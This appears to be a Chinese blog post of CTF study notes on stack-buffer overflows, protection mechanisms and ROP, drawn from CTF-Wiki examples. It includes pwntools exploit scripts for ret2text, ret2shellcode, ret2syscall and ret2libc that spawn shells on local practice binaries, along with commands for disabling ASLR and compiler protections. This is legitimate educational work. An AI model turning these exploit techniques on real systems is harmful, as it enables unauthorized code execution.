+++
title = 'CTF Wiki'

description = "CTF Wiki中几道例题的思路"

tags = [ "CTF" ]

date = 2019-06-20T00:06:21+08:00

+++

从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。

**0X01--栈溢出的基本原理：**

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:<u>1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。</u>

函数调用指令: **CALL**(注意理解EBP的变化过程，它指向下一条指令要操作的数据)

大致过程:

1. 参数入栈
2. 返回地址入栈
3. 代码区块跳转

栈帧调整:

1. 保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈)
2. 将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部)
3. 给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶)

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/t01b9be9878dadebed6.png)

**0X02--栈溢出的保护类型：**

知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。

1. **Canary**：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。<u>编译时的关闭指令：-fno-stack-protector</u>

2. **ALSR与PIE(Position Independent Executable)**：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功）
   <u>编译时ALSR的关闭指令：echo 0> /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态</u>，可以用cat+路径显示相关的参数：
   0 - 表示关闭进程地址空间随机化。
   1 - 表示将mmap的基址，stack和vdso页面随机化。
   2 - 表示在1的基础上增加栈（heap）的随机化。

   <u>PIE编译时的关闭指令：-no-pie</u>，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令`gcc -v`查看 gcc 默认的开关情况。

3. **Linux平台下的NX,Windows平台上的DEP**：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。

**0X03--编译指令：**

gcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie）

sudo -s
echo 0 > /proc/sys/kernel/randomize_va_space

($ cat /proc/sys/kernel/randomize_va_space指令检查)
exit（关闭ALSR)
-z execstack（关闭NX保护）

test.c -o test(由test.c生成test可执行文件)

-g(GDB调试)

**0X04--ROP原理：**

随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：

1. 程序存在溢出，并且可以控制返回地址。
2. 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。

ropgadget，注意命令格式：ROPgadget --binary [文件名] --only’寄存器名|寄存器名’ | grep ‘eax’。

**0X05--四种类型：**

**第一种类型ret2text:**

```
#include <stdio.h>
#include <string.h>
void success() 
{ 
puts(“You Hava already controlled it.”); 
}
void vulnerable()
{
char s[12];
gets(s);
puts(s);
return;
}
int main(int argc, char **argv) 
{
vulnerable();
return 0;
}
```

只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。

EXP如下：

```
##coding=utf8
## 导入pwntools库
from pwn import *
## 构造与程序交互的对象，sh = process('./文件名')表示打本地，日自己。
sh = process('./stack_example')
## 已知了想要执行的函数地址
success_addr = 0x0804843b
## 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
##print可以帮助自己看脚本执行到了哪一步
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
```

------

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets((char *)&v4);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system("/bin/sh")的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。

```
.text:080486A7                 lea     eax, [esp+1Ch]
.text:080486AB                 mov     [esp], eax      ; s
.text:080486AE                 call    _gets
```

由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。

```
gef➤  b *0x080486AE
Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
gef➤  r
There is something amazing here, do you know anything?

Breakpoint 1, 0x080486ae in main () at ret2text.c:24
24      gets(buf);
───────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebx   : 0x00000000
$ecx   : 0xffffffff
$edx   : 0xf7faf870  →  0x00000000
$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
$ebp   : 0xffffcdc8  →  0x00000000
$esi   : 0xf7fae000  →  0x001b1db0
$edi   : 0xf7fae000  →  0x001b1db0
$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>
```

断点下在Call处**<u>为什么是这个Call处？</u>**(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。

每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。**计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。**

EXP如下：

```
##!/usr/bin/env python

from pwn import *

sh = process('./ret2text')

target = 0x0804863a

sh.sendline('A' * (0x6c+4) + p32(target))

sh.interactive()
```

**上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。**

**第二种类型ret2shellcode：**

ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的**汇编代码**，常见的功能主要是获取目标系统的 shell。**一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码**。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(shellcraft.sh())。

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。

```
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
```

通过vmmap观察该bss段是否可执行：

```
gef➤  b main
Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint 1, main () at ret2shellcode.c:8
8       setvbuf(stdout, 0LL, 2, 0LL);
─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
      6  int main(void)
      7  {
 →    8      setvbuf(stdout, 0LL, 2, 0LL);
      9      setvbuf(stdin, 0LL, 1, 0LL);
     10  
─────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x8048536 → Name: main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx [stack]
```

所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。

EXP如下:

```
#!/usr/bin/env python
from pwn import *
sh = process('./ret2shellcode')
## 自动生成shellcode
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
## shellcode先放入，剩余的再用'A'填充至112长度。
sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
```

**第三种类型：ret2syscall：**
即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。

```
execve("/bin/sh",NULL,NULL)
```

由于该程序是 32 位，所以我们需要使得

- 系统调用号，即 eax 应该为 0xb
- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
- 第二个参数，即 ecx 应该为 0
- 第三个参数，即 edx 应该为 0

而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。

具体实现--ropgadgets 这个工具:

only ‘pop|ret’ | grep 'eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve("/bin/sh",NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。

平凡无奇的存在栈溢出漏洞的程序源码如下：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

**想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。**

此外，我们需要获得 /bin/sh 字符串对应的地址。

```
➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
Strings information
============================================================
0x080be408 : /bin/sh
```

以及int 0x80的地址：

```
➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
```

EXP如下：

```
#!/usr/bin/env python
from pwn import *

sh = process('./rop')

## 找到的gadgets及其地址
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。
payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])

sh.sendline(payload)
sh.interactive()
```

payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。

**第四种类型：ret2libc**

libc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system("/bin/sh").

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets((char *)&v4);
  return 0;
}
```

确定存在栈溢出漏洞,<u>用IDA找到了system函数,用ropgadget查找到"/bin/sh"</u>。

则EXP如下：

```
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')

binsh_addr = 0x8048720
system_plt = 0x08048460
payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

**这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。**

------

当查找不到"/bin/sh"时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。

EXP如下：

```
##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
pop_ebx = 0x0804843d
buf2 = 0x804a080
payload = flat(['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()
```

**注意payload中的pop_ebx是用来平衡堆栈的。**

------

同时找不到"/bin/sh"与system()函数地址的情况，用到了两个知识点：

- system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
- 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。

所以如果采用got表泄露(即输出某个函数对应的 got 表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。

此外，libc中是一定存在"/bin/sh"的，所以字符串地址也可以获取。这方面工具做的很完善。

示例：

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets((char *)&v4);
  return 0;
}
```

思路：

1. 泄露 __libc_start_main 地址
2. 获取 libc 版本
3. 获取 system 地址与 /bin/sh 的地址
4. 再次执行源程序
5. 触发栈溢出执行 system(‘/bin/sh’)

EXP如下：

```
#!/usr/bin/env python
from pwn import *
## 导入工具
from LibcSearcher import LibcSearcher
## 本地连接
sh = process('./ret2libc3')
## 将文件加载入进程
ret2libc3 = ELF('./ret2libc3')

##简化libc库中函数地址的表示方法
puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

## 监视程序进行到哪一步，提醒自己
print "leak libc_start_main_got addr and return to main again"
## puts函数泄露出start_main函数地址
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])

## 在输出前面字符串后，将payload输入
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式
libc_start_main_addr = u32(sh.recv()[0:4])
##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
## 已知基地址与相对地址，得到绝对地址
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

## 监视程序进行到哪一步
print "get shell"

payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

**0X05--稍作总结：**

ret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。

**0X06--MISC:**

1.最简单栈溢出，一套工具解决。

python pattern.py create 150
        gdb X
        run
        (input)
        q(uit)
        python pattern.py offset (address)

即可得到溢出地址

2.注意是返回地址，不是/bin/sh本身在栈上。

3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。

4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。

5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。

6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。

7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。

8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。

9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。

10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。
        PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。

11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分：
1.**栈区（stack）**：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.**堆区（heap)**： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回   收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.**数据区**：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.**代码区**：存放函数体的二进制代码。

12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是

```
\x3b\x84\x04\x08
```

但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。

13.常见的危险函数如下

- 输入
  - gets，直接读取一行，忽略'\x00'
  - scanf
  - vscanf
- 输出
  - sprintf
- 字符串
  - strcpy，字符串复制，遇到'\x00'停止
  - strcat，字符串拼接，遇到'\x00'停止
  - bcopy

计算**我们所要操作的地址与我们所要覆盖的地址的距离**。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

- 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得
- 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
- 直接地址索引，就相当于直接给定了地址。

一般来说，我们会有如下的覆盖需求

- **覆盖函数返回地址**，这时候就是直接看 EBP 即可。
- **覆盖栈上某个变量的内容**，这时候就需要更加精细的计算了。
- **覆盖 bss 段某个变量的内容**。
- 根据现实执行情况，覆盖特定的变量或地址的内容。

之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来**直接或者间接地控制程序执行流程**。

**0X06--尚存在的问题:**

1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。

2.ESP的调试为什么断点下在CALL处。

3.buf两端的问题。

4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。
解决此问题最简单的方法就是开启core dump功能，即：
ulimit -c unlimited
sudo sh -c ‘echo “/tmp/core.%t” > /proc/sys/kernel/core_pattern’
开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。





CTF-Wiki>Linux Pwn:

[Stack Overflow principle](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/)

[Basic ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/)

[系统调用](https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8)

[Github上Libc版本库](https://github.com/niklasb/libc-database)

[LibcSearcher工具](https://github.com/lieanu/LibcSearcher)

[现代栈溢出利用技术基础：ROP](https://www.anquanke.com/post/id/85831)

[一步一步学ROP之linux_x86篇](http://drops.xmd5.com/static/drops/tips-6597.html)

[一步一步学ROP之linux_x64篇](https://segmentfault.com/a/1190000007406442)

[手把手教你栈溢出从入门到放弃（上）](https://paper.seebug.org/271/)

[手把手教你栈溢出从入门到放弃（下）](https://paper.seebug.org/272/)

[Linux下pwn从入门到放弃](https://paper.seebug.org/481/)
